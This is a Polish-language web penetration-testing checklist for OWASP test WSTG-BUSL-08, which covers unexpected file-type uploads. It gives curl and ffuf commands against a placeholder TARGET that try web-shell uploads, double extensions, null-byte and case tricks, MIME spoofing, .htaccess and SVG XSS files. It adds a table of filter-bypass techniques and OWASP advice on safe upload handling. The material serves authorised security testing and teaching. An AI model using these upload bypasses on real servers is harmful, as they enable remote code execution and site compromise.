# WSTG-BUSL-08 — Test Upload of Unexpected File Types

## Cele

- Przetestowac odrzucanie nieoczekiwanych typow plikow
- Sprawdzic bezpieczna obsluge przeslanych plikow

## KOMENDY

### Upload roznych typow plikow

```bash
curl -v -X POST TARGET/api/upload -F "file=@test.html;type=text/html"
curl -v -X POST TARGET/api/upload -F "file=@test.php;type=application/x-php"
curl -v -X POST TARGET/api/upload -F "file=@test.exe;type=application/x-msdownload"
curl -v -X POST TARGET/api/upload -F "file=@test.jsp;type=application/jsp"
curl -v -X POST TARGET/api/upload -F "file=@test.svg;type=image/svg+xml"

```

### Upload z podwojnymi rozszerzeniami

```bash
curl -v -X POST TARGET/api/upload -F "file=@shell.php.jpg;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@shell.jpg.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php.png;type=image/png"
curl -v -X POST TARGET/api/upload -F "file=@test.asp.jpg;type=image/jpeg"

```

### Upload z null byte w nazwie pliku

```bash
curl -v -X POST TARGET/api/upload -F "file=@test.php%00.jpg;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php\x00.jpg;type=image/jpeg"

```

### Upload z alternatywnymi rozszerzeniami PHP

```bash
curl -v -X POST TARGET/api/upload -F "file=@test.phtml;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.pht;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php3;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php4;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php5;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.php7;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.phps;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.phar;type=image/jpeg"

```

### Upload z manipulacja MIME type

```bash
curl -v -X POST TARGET/api/upload -F "file=@shell.php;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@shell.php;type=image/png"
curl -v -X POST TARGET/api/upload -F "file=@shell.php;type=image/gif"

```

### Upload z case manipulation

```bash
curl -v -X POST TARGET/api/upload -F "file=@test.PhP;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.pHP;type=image/jpeg"
curl -v -X POST TARGET/api/upload -F "file=@test.Php;type=image/jpeg"

```

### Upload .htaccess

```bash
curl -v -X POST TARGET/api/upload -F "file=@.htaccess;type=text/plain"

```

### Upload SVG z XSS

```bash
curl -v -X POST TARGET/api/upload -F "file=@xss.svg;type=image/svg+xml"

```

## KOMENDY Z WORDLISTAMI

### Fuzzowanie rozszerzen plikow (fuzzdb file-upload)

```bash
# PHP filter bypass:
# Uzyj listy rozszerzen z:
# Desktop/WSTG/fuzzdb-master/attack/file-upload/alt-extensions-php.txt
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/alt-extensions-php.txt -mc all -c

```

### ASP filter bypass

```bash
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/alt-extensions-asp.txt -mc all -c

```

### JSP filter bypass

```bash
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/alt-extensions-jsp.txt -mc all -c

```

### Generic file upload filter bypass

```bash
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/file-ul-filter-bypass-x-platform-generic.txt -mc all -c

```

### PHP platform specific bypass

```bash
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/file-ul-filter-bypass-x-platform-php.txt -mc all -c

```

### Microsoft platform bypass

```bash
ffuf -u TARGET/api/upload -X POST -F "file=@shell.FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/file-upload/file-ul-filter-bypass-microsoft-asp.txt -mc all -c

```

### Commonly writable directories

```bash
# Referencja: Desktop/WSTG/fuzzdb-master/attack/file-upload/file-ul-filter-bypass-commonly-writable-directories.txt

```

### Invalid filenames (bypass)

```bash
# Linux: Desktop/WSTG/fuzzdb-master/attack/file-upload/invalid-filenames-linux.txt
# Microsoft: Desktop/WSTG/fuzzdb-master/attack/file-upload/invalid-filenames-microsoft.txt

```

### PayloadsAllTheThings - PHP upload shells

```bash
# Testuj pliki z: Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/
# Przyklad:
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.php"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.phtml"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension PHP/shell.phar"

```

### PayloadsAllTheThings - ASP upload shells

```bash
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension ASP/shell.asp"
curl -v -X POST TARGET/api/upload -F "file=@Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Extension ASP/shell.aspx"

```

### PayloadsAllTheThings - konfiguracje serwerowe

```bash
# Apache .htaccess:
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Configuration Apache .htaccess/
# IIS web.config:
# Desktop/WSTG/PayloadsAllTheThings-master/Upload Insecure Files/Configuration IIS web.config/

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. W Burp Suite -> Repeater: modyfikuj Content-Type header i rozszerzenie pliku
2. Testuj upload z roznych przegladarek (rozne zachowania)
3. Sprawdz gdzie przesylane pliki sa przechowywane i czy sa dostepne publicznie
4. Sprawdz czy serwer sprawdza magic bytes (file signature) a nie tylko rozszerzenie
5. Testuj upload .svg z JavaScript (XSS przez SVG)
6. Testuj upload .html z JavaScript
7. Sprawdz maksymalny rozmiar pliku i zachowanie przy jego przekroczeniu


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — File_Upload_Cheat_Sheet.md

### Walidacja typu pliku — wielowarstwowa

- **Warstwa 1 — Rozszerzenie**: allowlist dozwolonych (`.jpg`, `.png`, `.pdf`) — NIE denylist
- **Warstwa 2 — MIME type**: sprawdz `Content-Type` header — ALE latwo sfalszywowalny
- **Warstwa 3 — Magic bytes**: sprawdz pierwsze bajty pliku (sygnatura) — trudniejsze do obejscia
- **Warstwa 4 — Zawartosc**: re-enkoduj obrazy (PIL, ImageMagick) — usun wbudowane payloady
- Sprawdzaj **WSZYSTKIE warstwy** — kazda z osobna moze byc obejscia

### Techniki bypass filtrow uploadu

| Technika | Przyklad | Opis |
|----------|---------|------|
| Podwojne rozszerzenie | `shell.php.jpg` | Serwer moze interpretowac jako PHP |
| Alternatywne rozszerzenia | `.phtml`, `.phar`, `.php5` | Moga byc interpretowane jako PHP |
| Case manipulation | `.PhP`, `.pHP`, `.Php` | Case-insensitive serwer moze je przetworzyc |
| Null byte | `shell.php%00.jpg` | Starszy PHP obcina po null byte |
| MIME spoof | `Content-Type: image/jpeg` na .php | Filtr sprawdza MIME, nie zawartosc |
| Polyglot | Prawidlowy JPEG z PHP w komentarzu | Przechodzi walidacje obrazu |
| .htaccess upload | `AddType application/x-httpd-php .jpg` | Pliki .jpg interpretowane jako PHP |
| Trailing chars | `shell.php.`, `shell.php::$DATA` | Windows ignoruje trailing dot/ADS |

### Bezpieczne przechowywanie plikow

- Przechowuj **POZA webroot** — brak bezposredniego dostepu przez URL
- **Zmien nazwe** na losowa (UUID) — zapobiegaj path traversal i name collision
- **Osobna domena/CDN**: serwuj z innej domeny — izoluj od glownej aplikacji
- **Bez execute**: pliki nie powinny miec uprawnienia execute
- **Content-Disposition: attachment** — wymuszaj pobieranie zamiast renderowania
- **X-Content-Type-Options: nosniff** — zapobiegaj MIME sniffing

### Limity uploadu

- **Max rozmiar**: ustaw limit (np. 10 MB) — zapobiegaj DoS
- **Max ilosc**: ogranicz uploady per uzytkownik/sesje/czas
- **Quota dyskowa**: ogranicz calkowita przestrzen per uzytkownik
- **Skanuj antywirusem**: ClamAV lub cloud scanning przed zapisaniem

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Upload Scanner | Kompleksowe testy bezpieczenstwa uploadu plikow | [GitHub](https://github.com/modzero/mod0BurpUploadScanner) |
| ZIP File Raider | Testowanie podatnosci w przetwarzaniu plikow ZIP | [GitHub](https://github.com/destine21/ZIPFileRaider) |
